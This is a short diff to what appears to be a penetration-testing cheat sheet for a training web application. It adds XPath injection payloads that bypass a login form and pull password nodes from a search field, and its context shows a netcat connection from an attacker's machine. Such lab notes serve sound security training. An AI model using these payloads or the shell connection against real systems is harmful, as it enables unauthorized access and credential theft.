@@ -64,7 +64,17 @@ Attacker's machine:
 ```
 nc -nv 192.168.200.150 775
 
+### XPath Injection (Login Form)
+```
+password=' or id='2
+```
 
+### XML/XPath Injection (Search)
+```
+genre=')]/password | a[contains(a,'
+genre=') or contains(genre, '
+genre=') or not(contains(genre, 'xxx') and '1'='2
+```
 
 
 # A3 - Cross-Site Scripting (XSS) 
